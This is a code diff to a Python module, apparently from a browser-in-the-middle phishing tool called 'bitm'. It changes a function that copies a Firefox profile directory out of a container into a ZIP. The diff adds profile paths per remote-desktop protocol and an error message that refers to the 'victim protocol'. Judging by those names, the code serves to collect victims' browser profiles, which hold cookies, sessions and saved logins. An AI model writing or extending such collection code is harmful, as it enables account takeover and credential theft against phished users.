@@ -12,7 +12,10 @@ from utils.files import convert_tar_to_zip
 from sqlalchemy.orm import Session
 
 APP_DIR = "/bitm/app"
-FIREFOX_DIR = "/config/.mozilla/firefox/bitm-profile"
+FIREFOX_PROFILE_DIRS = {
+    "selkies": "/config/.mozilla/firefox/bitm-profile",
+    "vnc": "/bitm/.mozilla/firefox/bitm-profile",
+}
 
 logger = logging.getLogger(__name__)
 
@@ -70,12 +73,20 @@ async def dump_firefox_data(
     container_name: str,
     destination: Path,
     *,
+    protocol: str,
     max_bytes: int | None = None,
 ) -> int | None:
     """Write a bounded Firefox profile ZIP and return its compressed size."""
     container = get_container(container_name)
-    firefox_profile_dir = FIREFOX_DIR
-    exec_result = container.exec_run(f"test -d {firefox_profile_dir}", stdout=False, stderr=False)
+    try:
+        firefox_profile_dir = FIREFOX_PROFILE_DIRS[protocol]
+    except KeyError as exc:
+        raise ValueError(f"Unsupported victim protocol: {protocol}") from exc
+    exec_result = container.exec_run(
+        f"test -d {firefox_profile_dir}",
+        stdout=False,
+        stderr=False,
+    )
     if exec_result.exit_code != 0:
         raise Exception("Firefox profile directory not found")
     stream, _stat = container.get_archive(firefox_profile_dir)
